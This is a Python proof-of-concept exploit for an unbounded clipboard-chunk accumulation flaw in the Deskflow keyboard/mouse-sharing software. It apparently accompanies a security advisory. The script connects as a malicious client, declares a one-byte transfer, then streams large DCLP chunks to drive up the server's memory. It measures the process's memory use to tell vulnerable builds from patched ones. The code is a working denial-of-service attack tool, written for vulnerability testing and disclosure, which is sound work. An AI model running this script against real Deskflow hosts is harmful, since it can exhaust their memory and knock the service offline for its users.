#!/usr/bin/env python3
"""
CVE-XXXX-XXXXX (GHSA-jf7g-qghg-p54x) - Deskflow unbounded clipboard chunk accumulation.

The receive path assembles clipboard data across many DCLP packets in
src/lib/deskflow/ClipboardChunk.cpp::assemble. A DataStart declares the
expected total size, each DataChunk is appended to a caller-owned string, and
only DataEnd validates that what accumulated matches the declared size:

    DataStart -> s_expectedSize = <declared>, dataCached.clear()
    DataChunk -> dataCached.append(data)              // no bound checked here
    DataEnd   -> if (s_expectedSize != dataCached.size()) return Error

Nothing on the DataChunk path enforces the declared size or the server's
configured clipboard limit (clipboardSize, default 3 MiB = 3145728 bytes). The
per-packet ceiling (PROTOCOL_MAX_MESSAGE_LENGTH, 4 MiB) only bounds one packet,
so a peer can declare 1 byte and then stream unlimited 1 MiB DataChunks. The
receiver buffers all of it and only notices at DataEnd, long after the memory
was allocated. Omitting DataEnd lets the buffer grow until the receiver is
unavailable.

    server receives from client: src/lib/server/ClientProxy1_6.cpp::recvClipboard
    client receives from server: src/lib/client/ServerProxy.cpp

Detection note: a disconnect probe is NOT a reliable signal for the server
direction. When the patched server rejects an oversized chunk, recvClipboard
returns false and ClientProxy1_0::handleData merely drains the input buffer and
keeps the connection open (it does not disconnect). The vulnerable server also
keeps the connection open. So both look identical over the socket; the only
observable difference is that the vulnerable server RETAINS the bytes in memory
(the receive buffer is a process-lifetime static that is never cleared) while
the patched server discards them. This PoC therefore measures the server
process RSS across the oversized stream: a vulnerable server's RSS climbs by
roughly the streamed volume, a patched server's stays flat. That is also the
actual impact being demonstrated - memory growth past the configured limit.

This runs as a malicious client against a local server (the advisory's setup),
because that needs no display on the attacker end. The same flaw is reachable
server -> client; a patched CLIENT additionally calls Client::disconnect on the
bad transfer, which the early-disconnect check below would catch.

Server log fingerprint on the vulnerable path (only surfaces at DataEnd, after
the oversized buffer already exists):

    ERROR: corrupted clipboard data, expected size=1 actual size=<bytes streamed>
"""

import argparse
import os
import socket
import ssl
import struct
import sys
import time

from utils import create_ssl_socket

PROTO_MAJOR, PROTO_MINOR = 1, 6
CHUNK_START, CHUNK_DATA, CHUNK_END = 1, 2, 3
CHUNK_BYTES = 1024 * 1024


def frame(payload):
    return struct.pack(">I", len(payload)) + payload


def recv_exact(sock, n):
    buf = bytearray()
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("peer closed during read")
        buf.extend(chunk)
    return bytes(buf)


def recv_packet(sock):
    size = struct.unpack(">I", recv_exact(sock, 4))[0]
    return recv_exact(sock, size) if size else b""


def connect(host, port, plaintext, timeout=10.0):
    if plaintext:
        sock = socket.create_connection((host, port), timeout=timeout)
        sock.settimeout(timeout)
        return sock
    return create_ssl_socket(host, port, timeout=timeout)


def handshake(sock, name):
    # Server speaks first. The protocol identifier is configurable on deskflow
    # (Server::protocolString -> "Synergy" or "Barrier"); echo back whatever the
    # server sent so HelloBack is accepted regardless of the chosen mode.
    hello = recv_packet(sock)
    if len(hello) < 7 or hello[:7] not in (b"Synergy", b"Barrier"):
        raise RuntimeError(f"unexpected hello: {hello!r}")
    proto_id = hello[:7]

    name_b = name.encode()
    sock.sendall(frame(proto_id
                       + struct.pack(">HH", PROTO_MAJOR, PROTO_MINOR)
                       + struct.pack(">I", len(name_b)) + name_b))

    # Pacing matters: TCPSocket::doRead emits inputReady only when its input
    # buffer transitions empty -> non-empty. Reading QINF here forces a
    # roundtrip so the following DInfo lands as a fresh segment and wakes the
    # new ClientProxy1_x handler.
    qinfo = recv_packet(sock)
    if not qinfo.startswith(b"QINF"):
        raise RuntimeError(f"expected QINF, got: {qinfo!r}")

    sock.sendall(frame(b"DINF" + struct.pack(">7H", 0, 0, 1920, 1080, 0, 960, 540)))

    # Drain optional server follow-ups (CIAK / CROP / DSOP / CALV) so they don't
    # sit in our receive buffer while we stream.
    sock.settimeout(0.3)
    try:
        while True:
            recv_packet(sock)
    except (socket.timeout, ssl.SSLWantReadError, ssl.SSLError, OSError):
        pass
    sock.settimeout(10.0)


def dclp(seq, mark, data):
    return frame(b"DCLP"
                 + struct.pack(">B", 0)
                 + struct.pack(">I", seq)
                 + struct.pack(">B", mark)
                 + struct.pack(">I", len(data)) + data)


def peer_closed(sock):
    sock.settimeout(0.05)
    try:
        return sock.recv(1) == b""
    except (socket.timeout, ssl.SSLWantReadError):
        return False
    except (ssl.SSLError, OSError):
        return True
    finally:
        sock.settimeout(10.0)


def read_rss_bytes(pid):
    try:
        with open(f"/proc/{pid}/status") as f:
            for line in f:
                if line.startswith("VmRSS:"):
                    return int(line.split()[1]) * 1024
    except (OSError, ValueError):
        return None
    return None


def find_server_pid():
    hits = []
    self_pid = os.getpid()
    for entry in os.listdir("/proc"):
        if not entry.isdigit() or int(entry) == self_pid:
            continue
        try:
            with open(f"/proc/{entry}/cmdline", "rb") as f:
                argv = f.read().split(b"\x00")
        except OSError:
            continue
        joined = b" ".join(argv)
        if b"deskflow" in joined and (b"server" in joined or b"core" in joined):
            hits.append(int(entry))
    return hits


def stream_oversized(sock, declared, target_bytes, send_end):
    sock.sendall(dclp(1, CHUNK_START, str(declared).encode()))

    pushed = 0
    while pushed < target_bytes:
        n = min(CHUNK_BYTES, target_bytes - pushed)
        try:
            sock.sendall(dclp(1, CHUNK_DATA, b"A" * n))
        except (ssl.SSLError, OSError):
            return pushed, False
        pushed += n
        print(f"    streamed {pushed // (1024 * 1024)} MiB", end="\r", flush=True)
        if peer_closed(sock):
            print()
            return pushed, False
    print()

    if send_end:
        try:
            sock.sendall(dclp(1, CHUNK_END, b""))
        except (ssl.SSLError, OSError):
            return pushed, False

    return pushed, True


def main():
    ap = argparse.ArgumentParser(
        description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=24800)
    ap.add_argument("--name", default="deskflow-poc",
                    help="screen name; must match a configured screen on the target server")
    ap.add_argument("--plaintext", action="store_true",
                    help="speak plaintext instead of tls (target must have tlsEnabled=false)")
    ap.add_argument("--declared", type=int, default=1,
                    help="size declared in DataStart, in bytes")
    ap.add_argument("--mib", type=int, default=16,
                    help="total clipboard bytes to stream; set well above the target's clipboardSize")
    ap.add_argument("--limit-mib", type=int, default=3,
                    help="target's configured clipboardSize, for the vulnerable/fixed threshold")
    ap.add_argument("--send-end", action="store_true",
                    help="send DataEnd after streaming (produces the 'corrupted clipboard data' log)")
    ap.add_argument("--server-pid", type=int, default=None,
                    help="pid of the local deskflow server to sample RSS; auto-detected if omitted")
    args = ap.parse_args()

    target_bytes = args.mib * 1024 * 1024
    limit_bytes = args.limit_mib * 1024 * 1024

    print("CVE-XXXX-XXXXX - unbounded clipboard chunk accumulation (GHSA-jf7g-qghg-p54x)")
    print(f"target: {args.host}:{args.port}  name: {args.name!r}  transport: "
          f"{'plaintext' if args.plaintext else 'tls'}")
    print(f"declaring {args.declared} byte(s), streaming {args.mib} MiB "
          f"(configured limit {args.limit_mib} MiB)")

    pid = args.server_pid
    if pid is None:
        found = find_server_pid()
        if len(found) == 1:
            pid = found[0]
        elif len(found) > 1:
            print(f"[warn] multiple deskflow processes {found}; pass --server-pid to pick one")
    if pid is not None:
        print(f"sampling rss of server pid {pid}")
    print()

    rss_before = read_rss_bytes(pid) if pid else None

    sock = connect(args.host, args.port, args.plaintext)
    try:
        handshake(sock, args.name)
        pushed, alive = stream_oversized(sock, args.declared, target_bytes, args.send_end)
        time.sleep(1.5)
        rss_after = read_rss_bytes(pid) if pid else None
    finally:
        try:
            sock.close()
        except Exception:
            pass

    print(f"  accepted: {pushed // (1024 * 1024)} MiB ({pushed} bytes), "
          f"peer alive after stream: {alive}")

    if not alive and pushed < target_bytes:
        print(f"[PASS] peer dropped the transfer at {pushed} bytes - limit enforced on receive")
        return 0

    if rss_before is not None and rss_after is not None:
        delta = rss_after - rss_before
        threshold = max(limit_bytes, target_bytes // 2)
        print(f"  server rss: {rss_before // (1024*1024)} -> {rss_after // (1024*1024)} MiB "
              f"(delta {delta // (1024*1024)} MiB, threshold {threshold // (1024*1024)} MiB)")
        if delta >= threshold:
            print(f"[FAIL] server retained the oversized buffer (rss grew {delta} bytes) - "
                  f"VULNERABLE (GHSA-jf7g-qghg-p54x)")
            return 1
        print("[PASS] server rss stayed flat - oversized data discarded on receive")
        return 0

    print("[INCONCLUSIVE] peer accepted the full oversized stream without disconnecting, but no "
          "rss sample was taken.")
    print("  a patched server also stays connected (it drains and discards), so the socket alone")
    print("  can't decide it. re-run with --server-pid <pid>, or check the server log for")
    print("  'exceeds expected size' / 'exceeds maximum size' (patched) vs 'corrupted clipboard")
    print("  data' at DataEnd (vulnerable).")
    return 2


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
